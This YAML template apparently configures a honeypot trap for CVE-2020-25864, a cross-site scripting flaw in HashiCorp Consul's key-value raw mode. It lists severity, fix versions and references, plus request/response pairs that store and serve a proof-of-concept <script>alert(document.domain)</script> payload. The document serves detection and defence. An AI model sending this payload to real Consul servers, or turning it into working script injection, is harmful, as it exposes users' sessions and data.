id: CVE-2020-25864
info:
  name: HashiCorp Consul/Consul Enterprise <=1.9.4 - Cross-Site Scripting
  author: c-sh0
  description: 'HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable
    to cross-site scripting via the key-value (KV) raw mode.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft, session hijacking, or defacement of the affected Consul/Consul
    Enterprise application.

    '
  remediation: Fixed in 1.9.5, 1.8.10 and 1.7.14.
  reference:
  - https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368
  - https://www.hashicorp.com/blog/category/consul
  - https://nvd.nist.gov/vuln/detail/CVE-2020-25864
  - https://security.gentoo.org/glsa/202208-09
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-25864
    cwe-id: CWE-79
    epss-score: 0.00324
    epss-percentile: 0.70154
    cpe: cpe:2.3:a:hashicorp:consul:*:*:*:*:-:*:*:*
  metadata:
    max-request: 2
    vendor: hashicorp
    product: consul
  tags: cve,cve2020,consul,xss,intrusive,hashicorp
traps:
- request:
    method: PUT
    path: /v1/kv/
    headers: {}
    body: '<!DOCTYPE html><script>alert(document.domain)</script>

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: ''
- request:
    method: GET
    path: /v1/kv/%3Fraw
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <!DOCTYPE html><script>alert(document.domain)</script>
